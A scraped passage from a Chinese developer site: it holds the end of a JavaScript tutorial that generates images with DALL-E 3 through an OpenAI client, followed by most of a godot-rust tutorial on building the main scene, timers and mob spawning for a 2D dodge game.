<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 准备阶段：导入工具和配置</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">'dotenv'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"openai"</span>;

<span class="hljs-comment">// 2. 初始化阶段：读取配置并建立连接</span>
<span class="hljs-title function_">config</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'.env'</span> });
<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
    <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OpenAI_API_KEY</span>,
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.agicto.cn/v1'</span>
});

<span class="hljs-comment">// 3. 执行阶段：定义主逻辑</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 3.1 构造请求：告诉AI要画什么</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> client.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>({
            <span class="hljs-attr">model</span>: <span class="hljs-string">"dall-e-3"</span>,           <span class="hljs-comment">// 选择模型引擎</span>
            <span class="hljs-attr">prompt</span>: <span class="hljs-string">"A spaceship flying through the universe"</span>,  <span class="hljs-comment">// 核心指令</span>
            <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,                        <span class="hljs-comment">// 生成数量</span>
            <span class="hljs-attr">size</span>: <span class="hljs-string">"1024x1024"</span>            <span class="hljs-comment">// 图片规格</span>
        });
        
        <span class="hljs-comment">// 3.2 处理响应：获取结果</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"AI作品网址:"</span>, response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">url</span>);
        
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-comment">// 4. 错误处理：优雅应对异常</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"生成图片失败:"</span>, error.<span class="hljs-property">message</span>);
    }
};

<span class="hljs-comment">// 5. 启动应用</span>
<span class="hljs-title function_">main</span>();
</code></pre>
<h3 data-id="heading-14">六、项目扩展思路</h3>
<h4 data-id="heading-15">1. 功能增强方向</h4>
<ul>
<li><strong>批量生成</strong>：读取文本文件，自动生成多张图片</li>
<li><strong>风格转换</strong>：集成不同艺术风格的提示词模板</li>
<li><strong>结果处理</strong>：自动下载图片到本地目录</li>
</ul>
<h4 data-id="heading-16">2. 工程化改进</h4>
<ul>
<li><strong>配置文件</strong>：将模型参数、图片尺寸等提取到配置文件中</li>
<li><strong>日志系统</strong>：添加详细的运行日志记录</li>
<li><strong>错误重试</strong>：网络异常时自动重试机制</li>
</ul>
<h4 data-id="heading-17">3. 业务集成</h4>
<ul>
<li><strong>Web接口</strong>：封装成HTTP API供前端调用</li>
<li><strong>定时任务</strong>：定期自动生成特定主题的图片</li>
<li><strong>内容管理</strong>：将生成的图片信息保存到数据库</li>
</ul>
<p>这个项目虽然代码量不大，但包含了现代JavaScript开发的核心理念和技术栈。理解这些原理，你就能快速扩展到其他AIGC领域，如文本生成、语音合成等，真正掌握AI时代的开发技能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[godot-rust（gdext）你的第一个2D游戏 - 5]]></title>    <link>https://juejin.cn/post/7600837236619870260</link>    <guid>https://juejin.cn/post/7600837236619870260</guid>    <pubDate>2026-01-30T07:21:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600837236619870260" data-draft-id="7600606150732693547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="godot-rust（gdext）你的第一个2D游戏 - 5"/> <meta itemprop="keywords" content="游戏"/> <meta itemprop="datePublished" content="2026-01-30T07:21:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="柚要做甚码"/> <meta itemprop="url" content="https://juejin.cn/user/2200546203156138"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            godot-rust（gdext）你的第一个2D游戏 - 5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2200546203156138/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    柚要做甚码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:21:04.000Z" title="Fri Jan 30 2026 07:21:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">简介</h2>
<p>本文以<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.godotengine.org%2Fzh-cn%2F4.5%2Fgetting_started%2Ffirst_2d_game%2Findex.html" target="_blank" title="https://docs.godotengine.org/zh-cn/4.5/getting_started/first_2d_game/index.html" ref="nofollow noopener noreferrer">你的第一个 2D 游戏 — Godot Engine (4.5) 简体中文文档</a>为蓝本撰写，godot-rust提供了该教程的一个rust的实现<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgodot-rust%2Fdemo-projects%2Ftree%2Fmaster%2Fdodge-the-creeps" target="_blank" title="https://github.com/godot-rust/demo-projects/tree/master/dodge-the-creeps" ref="nofollow noopener noreferrer">dodge-the-creeps</a>，与本文方法会稍有不同。如果你对rust、godot等内容比较生疏或感到疑惑，可以先阅读<a href="https://link.juejin.cn/?target=https%3A%2F%2Fcolinwttt.github.io%2Fgodot-rust-book-chinese%2Fintro%2Findex.html" title="https://link.juejin.cn/?target=https%3A%2F%2Fcolinwttt.github.io%2Fgodot-rust-book-chinese%2Fintro%2Findex.html" target="_blank">godot-rust入门文档</a>。</p>
<p>本文搭建在<a href="https://juejin.cn/post/7599566082212986932" target="_blank" title="https://juejin.cn/post/7599566082212986932">godot-rust（gdext）创建项目</a>的基础之上，如果你对该部分内容感到生疏，可以先阅读这部分内容，为接下来的操作做好准备。</p>
<p><strong>注意，本文使用的godot版本为4.5.1，godot版本的变化可能会导致一些内容失效</strong>。</p>
<p>本文操作均在Windows上执行。</p>
<h2 data-id="heading-1">正文</h2>
<h3 data-id="heading-2">创建主场景</h3>
<p>在rust中创建<strong>主场景</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> godot::prelude::*;

<span class="hljs-meta">#[derive(GodotClass)]</span>
<span class="hljs-meta">#[class(base=Node)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Main</span> {
    base: Base&lt;Node&gt;,
}
<span class="hljs-meta">#[godot_api]</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">INode</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>(base: Base&lt;Node&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> { base }
    }
}
</code></pre>
<blockquote>
<p>我们之所以使用 Node 而不是 Node2D，是因为这个节点会作为处理游戏逻辑的容器使用。本身是不需要 2D 功能的。</p>
</blockquote>
<p>编译rust</p>
<pre><code class="hljs">cargo build
</code></pre>
<p>回到godot编辑器，如同之前一样创建新场景：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4ee8281d80749ffb3160235f0870e7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=dSlvFeSkTkjmmhyo9qMNyB34JRA%3D" alt="创建Main" loading="lazy"/></p>
<p>保存main场景，这时你的<strong>文件系统</strong>看上去应该像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cd9554e70494b209f732aa1ce28a553~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=DY0T1QlV%2FfOy5hW87vUlaLU6BSM%3D" alt="保存main场景" loading="lazy"/></p>
<p>在<code>Main</code>场景下实例化你的<code>Player</code>使其成为一个子节点：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d386421535564ca29ffae349417487d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=8ooJsij2gTNZYPnOJbcP%2BHljVKo%3D" alt="实例化场景" loading="lazy"/></p>
<p>为<code>Main</code>添加子节点:</p>
<ul>
<li><code>Timer</code>更名为<code>MobTimer</code> —— 控制怪物产生的频率</li>
<li><code>Timer</code>更名为<code>ScoreTimer</code> —— 计算游玩秒数，即分数</li>
<li><code>Timer</code>更名为<code>StartTimer</code> —— 在游戏开始之前给出延迟</li>
<li><code>Marker2D</code>更名为<code>StartPosition</code> —— 表示玩家的起始位置</li>
</ul>
<p>在每个<code>Timer</code>节点的<strong>检查器</strong>面板中设置<code>Wait Time</code>属性：</p>
<ul>
<li><code>MobTimer</code>：<code>0.5s</code></li>
<li><code>ScoreTimer</code>：<code>1s</code></li>
<li><code>StartTimer</code>：<code>2s</code></li>
</ul>
<p>注意，我们并没有为<code>Main</code><strong>编组</strong>。</p>
<p>在<code>StartTimer</code>的<strong>检查器</strong>面板中，启用<code>One Shot</code>属性，<code>StartPosition</code>的<code>Position</code>属性设置为<code>x = 240, y = 450</code>。</p>
<h3 data-id="heading-3">生成怪物</h3>
<p>在主场景中我们需要实现生成怪物的逻辑，它是从游戏屏幕边缘随机位置生成，为<code>Main</code>添加子节点<code>Path2D</code>并命名为<code>MobPath</code>，选中<code>MobPath</code>，在工具栏你应该会发现一些新的按钮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88fa44670eb5495283d63513bedeca59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=SoBImVOYXZZ9pth%2BBK2Ig8T7mvI%3D" alt="工具栏变化" loading="lazy"/></p>
<p>推荐将<strong>使用智能吸附</strong>和<strong>使用栅格吸附</strong>这两个功能打开</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae4a6d1fef854cbf9a3bc69a42914ada~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=cJ%2FImZdkfmHEiESclCQ1zdgly0Y%3D" alt="使用吸附" loading="lazy"/></p>
<p>使用按住<code>ctrl + 鼠标左键</code>方式，如下图所示，顺时针方式为你的游戏边框生成一条路径：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc7a2f9cc77e4a65af8044b662c852a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=NL3NniYmz%2FSJJMhLA96sIm1kXl8%3D" alt="draw_path2d.gif" loading="lazy"/></p>
<p>完成后你应该能在你的编辑器中看到如下所示带箭头的一个闭合矩形，大小和你的游戏屏幕一致：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0911f06e695a40afaa03c89974376407~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=WIaMJqE0njdJvC76IbGBZADAtOQ%3D" alt="微信图片_20260130085358_66_27.jpg" loading="lazy"/></p>
<p><em>原文提到“以顺时针的顺序绘制路径，否则小怪会向外而非向内生成！”，并非指顺时针这个方向是什么特别约定或者对godot引擎来说有何特别之处，是由于其生成怪物算法依赖了上图中路径的箭头方向</em></p>
<p>再为<code>Path2D</code>子节点添加子节点<code>PathFollow2D</code>并命名为<code>MobSpawnLocation</code>，此时你的节点结构看上去应该像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/847fd161374b4db7aacb4396e7f83689~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=siPiV2yG51J2AATQjJW%2FZxEzNJo%3D" alt="main的节点结构" loading="lazy"/></p>
<h3 data-id="heading-4">编写主场景代码</h3>
<p>在rust中向<code>Main</code>添加两个字段，并更新<code>init()</code>函数：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(GodotClass)]</span>
<span class="hljs-meta">#[class(base=Node)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-meta">#[export]</span>
    mob_scene: OnEditor&lt;Gd&lt;PackedScene&gt;&gt;,
    score: <span class="hljs-type">i64</span>,
    base: Base&lt;Node&gt;,
}
<span class="hljs-meta">#[godot_api]</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">INode</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>(base: Base&lt;Node&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> {
            mob_scene: OnEditor::<span class="hljs-title function_ invoke__">default</span>(),
            score: <span class="hljs-number">0</span>,
            base,
        }
    }
}
</code></pre>
<p>编译rust</p>
<pre><code class="hljs">cargo build
</code></pre>
<p>回到godot编辑器，在编辑器里给<code>mob_scene</code>赋值：</p>
<ul>
<li>将<code>mob.tscn</code>从<strong>文件系统</strong>面板拖放到<code>Mob Scene</code>属性里。</li>
<li>单击<code>[空]</code>旁边的下拉箭头按钮，选择“加载”。选择 <code>mob.tscn</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/388faf34c8c1430ab1fde1630e98ae00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-a6KaB5YGa55Sa56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770364413&amp;x-signature=8BMZ%2FdVhTO2RbFHwsXb40pjQrYE%3D" alt="初始化Mob" loading="lazy"/></p>
<p>我们先在<code>Main</code>中添加一个<code>game_over</code>方法：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[godot_api]</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">game_over</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Timer&gt;(<span class="hljs-string">"ScoreTimer"</span>).<span class="hljs-title function_ invoke__">stop</span>();
        <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Timer&gt;(<span class="hljs-string">"MobTimer"</span>).<span class="hljs-title function_ invoke__">stop</span>();
    }
}
</code></pre>
<p>将<code>Player</code>的<code>hit()</code>信号连接到<code>game_over()</code>，注意，在这之前请将<code>Player</code>和<code>Player</code>的<code>hit()</code>信号添加<code>pub</code>标识，让其在rust中外部可见：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Player</span>
......
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Player</span> {
    <span class="hljs-meta">#[signal]</span>
    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">hit</span>();
    ......
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[godot_api]</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">INode</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Main</span> {
    ......
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ready</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>()
            .get_node_as::&lt;Player&gt;(<span class="hljs-string">"Player"</span>)
            .<span class="hljs-title function_ invoke__">signals</span>()
            .<span class="hljs-title function_ invoke__">hit</span>()
            .<span class="hljs-title function_ invoke__">connect_other</span>(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">Self</span>::game_over);
    }
}
</code></pre>
<p>开始下一步之前我们在<code>impl Main</code>模块中准备一个<code>new_game()</code>方法以供备用，在这之前请将<code>player</code>的<code>start()</code>方法标记为<code>pub</code>，就像前面一步一样。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Main</span> {
    ......
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new_game</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">self</span>.score = <span class="hljs-number">0</span>;

        <span class="hljs-comment">// 获得我们定义的初始位置，即(240.0, 450.0)</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">position</span> = <span class="hljs-keyword">self</span>
            .<span class="hljs-title function_ invoke__">base</span>()
            .get_node_as::&lt;Marker2D&gt;(<span class="hljs-string">"StartPosition"</span>)
            .<span class="hljs-title function_ invoke__">get_position</span>();

        <span class="hljs-comment">// 展现godot-rust通过bind机制从GD对象调用Player定义的方法</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mob</span> = <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Player&gt;(<span class="hljs-string">"Player"</span>);
        {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">player</span> = mob.<span class="hljs-title function_ invoke__">bind_mut</span>(); <span class="hljs-comment">// 在区域内绑定，并在区域内释放</span>
            player.<span class="hljs-title function_ invoke__">start</span>(position);
        }

        <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Timer&gt;(<span class="hljs-string">"StartTimer"</span>).<span class="hljs-title function_ invoke__">start</span>();
    }
}
</code></pre>
<p>现在处理三个计时器<code>Timer</code>，在<code>impl Main</code>模块中添加三个<code>handle()</code>，在此之前你需要将你的<code>Mob</code>标记为<code>pub</code>让其在rust内外部可见：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_score_timer_timeout</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
    <span class="hljs-keyword">self</span>.score += <span class="hljs-number">1</span>; <span class="hljs-comment">// 每次ScoreTimer按照设置的等待时间跳一次，加一分</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_start_timer_timeout</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Timer&gt;(<span class="hljs-string">"MobTimer"</span>).<span class="hljs-title function_ invoke__">start</span>(); <span class="hljs-comment">// MobTimer开始计时</span>
    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base</span>().get_node_as::&lt;Timer&gt;(<span class="hljs-string">"ScoreTimer"</span>).<span class="hljs-title function_ invoke__">start</span>(); <span class="hljs-comment">// ScoreTimer开始计时</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">on_mob_timer_timeout</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">rng</span> = rand::<span class="hljs-title function_ invoke__">rng</span>();

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mob</span> = <span class="hljs-keyword">self</span>.mob_scene.instantiate_as::&lt;Mob&gt;(); <span class="hljs-comment">// 生成一个Mob实例</span>

    <span class="hljs-comment">// 在边框路径上随机获得一个点</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mob_spawn_location</span> = <span class="hljs-keyword">self</span>
        .<span class="hljs-title function_ invoke__">base</span>()
        .get_node_as::&lt;PathFollow2D&gt;(<span class="hljs-string">"MobPath/MobSpawnLocation"</span>);
    mob_spawn_location.<span class="hljs-title function_ invoke__">set_progress_ratio</span>(rng.<span class="hljs-title function_ invoke__">random_range</span>(<span class="hljs-number">0.0</span>..=<span class="hljs-number">1.0</span>));

    <span class="hljs-comment">// 将Mob实例放到随机点上</span>
    mob.<span class="hljs-title function_ invoke__">set_position</span>(mob_spawn_location.<span class="hljs-title function_ invoke__">get_position</span>());

    <span class="hljs-comment">// 根据随机点的方向顺时针正交出向游戏屏幕内的方向，并使这个方向在正负PI/4范围随机化</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">direction</span> = mob_spawn_location.<span class="hljs-title function_ invoke__">get_rotation</span>() + PI <span class="hljs-keyword">as</span> <span class="hljs-type">f32</span> / <span class="hljs-number">2.0</span>;
    direction += rng.<span class="hljs-title function_ invoke__">random_range</span>((-PI / <span class="hljs-number">4.0</span>)..=(PI / <span class="hljs-number">4.0</span>)) <span class="hljs-keyword">as</span> <span class="hljs-type">f32</span>;

    <span class="hljs-comment">// 将随机化的方向放置入mob实例</span>
    mob.<span class="hljs-title function_ invoke__">set_rotation</span>(direction);

    <span class="hljs-comment">// 随机一个速度，使速度和mob的朝向一致，并将这个速度设置为mob的线性速度</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">velocity</span> = Vector2::<span class="hljs-title function_ invoke__">new</span>(rng.<span class="hljs-title function_ invoke__">random_range</span>(<span class="hljs-number">150.0</span>..=<span class="hljs-number">250.0</span>), <span class="hljs-number">0.0</span>);
    mob.<span class="hljs-title function_ invoke__">set_linear_velocity</span>(velocity.<span class="hljs-title function_ invoke__">rotated</span>(direction));

    <span class="hljs-comment">// 向场景加入这个mob实例</span>
    <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">base_mut</span>().<span class="hljs-title function_ invoke__">add_child</span>(&amp;mob);
}

</code></pre>
<p><em>原文中的<code>randf()</code>、<code>randf_range()</code>辅助函数其实在<code>godot-rust 4.5</code>已经有了，你也可以使用这两个函数来辅助你生成随机数</em></p>
<p>在<code>ready()</code>中将<code>Timer</code>的<strong>信号</strong>连接到上述<code>handle</code>:</p>
